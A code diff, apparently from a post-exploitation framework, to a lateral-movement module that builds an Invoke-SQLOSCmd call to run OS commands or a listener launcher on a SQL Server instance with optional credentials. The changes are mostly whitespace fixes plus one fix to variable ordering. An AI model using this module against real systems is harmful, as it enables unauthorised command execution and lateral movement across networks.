@@ -11,7 +11,7 @@ class Module:
             'NeedsAdmin' : False,
             'OpsecSafe' : True,
             'Language' : 'powershell',
-			'MinPSVersion' : '2',
+            'MinPSVersion' : '2',
             'MinLanguageVersion' : '2',
             
             'Comments': []
@@ -76,6 +76,7 @@ class Module:
                 self.options[option]['Value'] = value
     def generate(self):
 
+        credID = self.options["CredID"]['Value']
         if credID != "":
             if not self.mainMenu.credentials.is_credential_valid(credID):
                 print helpers.color("[!] CredID is invalid!")
@@ -88,7 +89,7 @@ class Module:
             if password != "":
                 self.options["Password"]['Value'] = password
 
-		listenerName = self.options['Listener']['Value']
+        listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
@@ -96,7 +97,6 @@ class Module:
         command = self.options['Command']['Value']
         username = self.options['UserName']['Value']
         password = self.options['Password']['Value']
-        credID = self.options["CredID"]['Value']
 
 
         moduleSource = self.mainMenu.installPath + "data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1"
@@ -122,10 +122,10 @@ class Module:
                     command = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
 
 
-		script += "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
+        script += "Invoke-SQLOSCmd -Instance \"%s\" -Command \"%s\"" % (instance, command)  
 
         if username != "":
             script += " -UserName "+username
         if password != "":
-		    script += " -Password "+password
+            script += " -Password "+password
         return script
